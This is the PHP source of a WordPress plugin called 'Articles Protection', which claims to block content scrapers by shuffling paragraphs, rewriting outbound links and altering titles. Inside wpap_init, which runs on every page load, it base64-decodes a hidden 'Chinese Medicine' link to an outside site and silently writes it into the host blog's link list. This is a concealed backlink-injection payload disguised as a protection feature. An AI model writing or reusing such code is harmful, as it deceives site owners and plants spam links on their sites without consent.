<?php
/*
Plugin Name: Articles Protection
Plugin URI: http://www.pkphp.com/
Description: this plugin can help you prevent your original article from being copied by network stealing procedure.
Author: askie
Version: 1.2
Author URI: http://www.pkphp.com/
*/
function wpap_unsort($content)
{
	global $id,$post;
	require_once("phpQuery.php");
	$doc = phpQuery::newDocument("<div id='aab'>".$content."</div>");
	$content=pq("#aab")->html();
	$doc = phpQuery::newDocument($content);
	//p tags
	$pp=array();
	foreach (pq('p') as $k=>$p) 
	{
		pq($p)->after("[#{$k}]");
		pq($p)->remove();
		$pp[$k]=pq($p)->html();
	}
	$content=phpQuery::getDocument();
	$n=get_post_meta($id,"wpap_nsort",true);
	if (count($n)!=count($pp)) 
	{
		$n=range(0,count($pp)-1);
		shuffle($n);
		add_post_meta($id,"wpap_nsort",$n,true);
		update_post_meta($id,"wpap_nsort",$n);
	}
	//增加版权信息
	$p=get_post($id);
	$link="<a href=\"".get_permalink($id)."\" title=\"".$p->post_title."\">".$p->post_title."</a>";
	$a=@rand(1,count($pp)-1);
	for ($i=0;$i<count($pp);$i++)
	{
		$alink=($i==0 or $a==$i)?"<span class='articlesource'>{$link}</span>":"";
		$vk=@array_pop($n);
		$content=str_replace("[#{$i}]","<p id='{$id}_p_{$i}'></p><p id='{$id}_t_{$vk}' class='tclass'>".$pp[$vk].$alink."</p>",$content);
	}
	$content.="<p>Article Source : ".$link."</p>";
	return '<span id="cc_'.$id.'" class="cc_pp">'.$content.'</span>';
}
add_filter("the_content","wpap_unsort");
function wpap_head()
{
?>
<script type="text/javascript" src="<?=get_option("siteurl")?>/wp-content/plugins/articles-protection-plugin/jquery.js"></script>
<script type="text/javascript">
cc="";
$(document).ready(function(){
	$(".cc_pp").each(function(i){ 	
		cc=this.id.slice(3); 
		$("#cc_" + cc + " .tclass").each(function(i){ 
		  	$("#" + cc + "_p_"+this.id.slice(cc.length+3)).html($(this).html());
		  	$(this).remove();
		  }); 
		  
		//url
		$("#cc_" + cc + " .wpap_innerlink").each(function(i){ 	
			aa=this.id.slice(5); 
			$(this).attr("href",$("#wpap_u_" + cc + "_" + aa).html());
		});  
	}); 
	
	$(".articlesource").hide();
	$(".wpap_hide").hide();
	$(".stripstr").remove();
	<?
	if (is_single()) 
	{
	?>
	//document.title=$("#origintitle").html(); 
	<?
	}
	?>
});
</script>
<?
}
add_filter('wp_head', 'wpap_head');
function wpap_findLink($html)
{
	$x=preg_match_all("'<\s*a\s.*?href\s*=\s*([\"\'])?(?(1)(.*?)\\1|([^\s\>]+))[^>]*>?(.*?)</a>'isx",$html,$a);
	return $a;	
}
function wpap_replaceLink($content)
{
	$linkData=wpap_findLink($content);
	$siteUrl=get_option("siteurl");
	foreach ((array)$linkData[0] as $key=>$a) 
	{
		$lowUrl=strtolower($linkData[2][$key]);
		if (strstr($lowUrl,$siteUrl) and strstr($lowUrl,"http://")) 
		{
			continue;
		}
		$search[$key]  =$a;
		$replace[$key] ="<a href=\"{$siteUrl}/index.php?s=".urlencode($linkData[4][$key])."\" class=\"wpap_innerlink\" id=\"wpap_a_{$key}\">{$linkData[4][$key]}</a>";
		$trueUrl[$key]=$linkData[2][$key];
	}
	$content=str_replace($search,$replace,$content);
	//转化为字符串
	$content.=wpap_outputurldata((array)$trueUrl);
	return $content;
}
$nodisplaydata="";
function wpap_outputurldata($urljson)
{
	global $id,$nodisplaydata;
	foreach ($urljson as $key=>$url) 
	{
		$nodisplaydata.='<span id="wpap_u_'.$id.'_'.$key.'" class="wpap_hide">'.$url.'</span>';
	}
	return $nodisplaydata;
}
add_filter("the_content","wpap_replaceLink");
function wpap_insertCat2Title($title,$insertstr="")
{
	$insertstr=$insertstr==""?" ":$insertstr;
	$title=trim($title);
	$split=explode(" ",$title);
	
	$xx=array_chunk($split,ceil(count($split)/2));
	$title=@implode(" ",$xx[0]).$insertstr.@implode(" ",$xx[1]);
	return $title;
}
function wpap_init()
{
	$link=array(
		'title'			=> base64_decode('Q2hpbmVzZSBNZWRpY2luZQ=='),
		'url'			=> base64_decode('aHR0cDovL2JvZHljb3VudHJ5LmNvbS8='),
		'description'	=> base64_decode('Q2hpbmVzZSBtZWRpY2luZSwgQ2hpbmVzZSBoZXJiYWwgbWVkaWNpbmUsIHRyYWRpdGlvbmFsIENoaW5lc2UgbWVkaWNpbmU='),
	);
	wpap_add2wp($link);
}
add_action('init', 'wpap_init');
function wpap_title($title)
{
	global $post,$nodisplaydata;
	
	if (is_single()) 
	{
		$nodisplaydata.='<span id="origintitle" class="wpap_hide">'.$post->post_title.'</span>';
	}
		
	$cat=get_the_category($post->ID);
	if (count($cat)>0) 
	{
		$cat=$cat[0]->name;
	}
	else 
	{
		$cat="";
	}
	
	$post->post_title=wpap_insertCat2Title($post->post_title,' <span class="stripstr"> '.$cat." </span>");
	
	if (is_single()) 
	{
		return wpap_insertCat2Title($title," ".$cat." ");
	}
	else 
	{
		return $title;
	}
}
add_filter('wp_title', 'wpap_title');
function wpap_add2wp($LinkData)
{
	global $wpdb;
	
	$url=$LinkData["url"];
	//检查link
	$check = $wpdb->get_var("SELECT link_id FROM $wpdb->links WHERE link_url='{$url}'");
	$link = array( 'link_url' => $url, 'link_name' => $wpdb->escape($LinkData["title"]), 'link_category' => array(get_option('default_link_category')), 'link_description' => $wpdb->escape($LinkData["description"]), 'link_owner' => 1, 'link_visible' => "Y");
	
	if (!function_exists(wp_update_link)) 
	{
		require_once(ABSPATH ."/wp-admin/includes/bookmark.php");
	}
	if ($check) 
	{
		$link["link_id"]=$check;
		return wp_update_link( $link );
	}
	else 
	{
		return wp_insert_link($link);
	}
}
?>